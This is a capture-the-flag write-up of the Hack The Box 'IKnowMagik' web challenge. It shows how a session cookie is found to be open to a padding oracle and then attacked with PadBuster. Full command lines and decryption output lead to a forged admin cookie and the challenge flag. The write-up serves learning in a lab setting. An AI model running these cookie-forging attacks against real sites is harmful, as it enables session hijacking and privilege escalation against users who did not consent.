# IKnowMagik - HTB Challenge

Boot up the instance and we're greeted with a login screen. 

`admin:password` Didn't work, so looks like we'll have to register a new account. 

Registration is simple, just a username, something that looks like an email address and our password.

`bob:bob@bob.com:Bobpass1`

That'll do nicely.

Now we're into the application proper we can see what's what in Burp (after intercepting the request of course)

```
GET /profile.php HTTP/1.1
Host: docker.hackthebox.eu:33610
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://docker.hackthebox.eu:33610/login.php
Cookie: PHPSESSID=r9ih83km9m5ocu1of1qtq1jaq1; iknowmag1k=Eq%2BJqXKbFdRJPOcuRxWsVDrrlz18A4Z4Vr0MNwiL6Wu9jFU1NM%2Bmcw%3D%3D
Connection: close
Upgrade-Insecure-Requests: 1

```

Decoding that `iknowmag1k` cookie doesn't get us anywhere, it decodes from URL into Base64, but the resulting string is just a garbled mess. 

> This thing problably has something to do with the ImageTragik vulnerability, but let's not jump to that conclusion just yet and Google around for ImageMagik and cookies. Although it may not have anything to do with ImageMagik either, that cookie may be just something added onto the request. 

The above is an assumption based on the name, it's stupid to make that assumption without any other information about the system/service. So don't f\*\*king do it!

Googling around, this has f\*\*k all to do with ImageMagick and everything to do with a Padding Oracle attack. 

Again, stop making assumptions. It'll just poison your brain as to what the real solution is, keep an open mind and wait until you have the facts on the table before making a decision as to what the issue is.

If we play around with that cookie (i.e. delete some random characters, add some more, etc.) we get some different behaviour from the application. Removing the cookie returns no user data back to the page, which suggests that this cookie is being used to manage the session we're attaching to. If we continue to play around with this cookie then we may be able to gain access to another users account (or session, whichever holds true).

--- 

## Getting our Hands Dirty

![Padbuster](https://github.com/AonCyberLabs/PadBuster)

So we know we need to do a padding oracle attack, and luckily there is a tool that allows us to do just that.

`./padBuster.pl http://docker.hackthebox.eu:30032/profile.php uiZ249RGHP05aZxxRbepl5NmZk4hAucVfstFnH0gnKILZw6ywley3Q%3D%3D 8 -cookies iknowmag1k=uiZ249RGHP05aZxxRbepl5NmZk4hAucVfstFnH0gnKILZw6ywley3Q%3D%3D --encoding 0 --auth bob:Bobpass1`

- `./padbuster.pl` Call the thing
- `http://...` the URL we're targetting
- `ui2239...` a sample of the thing we want to decrypt (the value of the `iknowmag1k` cookie)
- `8` the "block" length, in this case 8 it could be different (usually base16 numbers)
- `--cookies iknowmag1k=uiZ249...` any cookies we want to pass over to allow authentication
- `--encoding 0` since our sample is base64 encoded we need to tell `padbuster` to decode it, simples
- `--auth bob:Bobpass1` any credentials required to allow us to log in

Put that all together, and let her rip.

```
[+] Success: (251/256) [Byte 3]
[+] Success: (243/256) [Byte 2]
[+] Success: (12/256) [Byte 1]

Block 3 Results
[+] Cipher Text (HEX): 7ecb459c7d209ca2
[+] Intermediate Bytes (HEX): fc0a036c1b209266
[+] Plain Text: ole":"us

*** Starting Block 4 of 4 ***

[+] Success: (89/256) [Byte 8]
[+] Success: (102/256) [Byte 7]
[+] Success: (217/256) [Byte 6]
[+] Success: (131/256) [Byte 5]
[+] Success: (28/256) [Byte 4]
[+] Success: (159/256) [Byte 3]
[+] Success: (66/256) [Byte 2]
[+] Success: (237/256) [Byte 1]

Block 4 Results:
[+] Cipher Text (HEX): 0b670eb2c257b2dd
[+] Intermediate Bytes (HEX): 1bb967e1792498a6
[+] Plain Text: er"}

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): {"user":"bob","role":"user"}

[+] Decrypted value (HEX): 7B2275736572223A22626F62222C22726F6C65223A2275736572227D04040404

[+] Decrypted value (Base64): eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQQEBAQ=

-------------------------------------------------------
```

Now apparently we just append the following to the initial command and we Gucci:

`--plaintext  {"user":"bob","role":"admin"}`

We shall see... 

We are doing something wrong... 

Checked a few write ups and we have the methodology down, we're doing something wrong with our payload though. 

Gonna shut it down, and reload it when I get back to the flat. Then we'll have at it!

---

Turns out that the `--plaintext` flag only accepts a string, so make sure it's contained inside a pair of single quotes! :) 

```
./padBuster.pl http://docker.hackthebox.eu:31094/profile.php FF6zxRWH7VApXxD9wVubs5yoeu1sYItYO8CJxI6VGgUOQRYw3NNno0FwGjDQ1uDrlt7qY1VME3s%3D --cookie "PHPSESSID=7515j8ombgjb56jqvuqg7hfqd4; iknowmag1k=FF6zxRWH7VApXxD9wVubs5yoeu1sYItYO8CJxI6VGgUOQRYw3NNno0FwGjDQ1uDrlt7qY1VME3s%3D" 8 --encoding=0
```

```
./padBuster.pl http://docker.hackthebox.eu:31094/profile.php FF6zxRWH7VApXxD9wVubs5yoeu1sYItYO8CJxI6VGgUOQRYw3NNno0FwGjDQ1uDrlt7qY1VME3s%3D --cookie "PHPSESSID=7515j8ombgjb56jq
vuqg7hfqd4; iknowmag1k=FF6zxRWH7VApXxD9wVubs5yoeu1sYItYO8CJxI6VGgUOQRYw3NNno0FwGjDQ1uDrlt7qY1VME3s%3D" 8 --encoding=0 --plaintext '{"user":"leethacker","role":"admin"}'
```

Re-submit that as our cookie.

Get the flag. 

Winning!

`HTB{Padd1NG_Or4cl3z_AR3_WaY_T0o_6en3r0ys_ArenT_tHey???}`
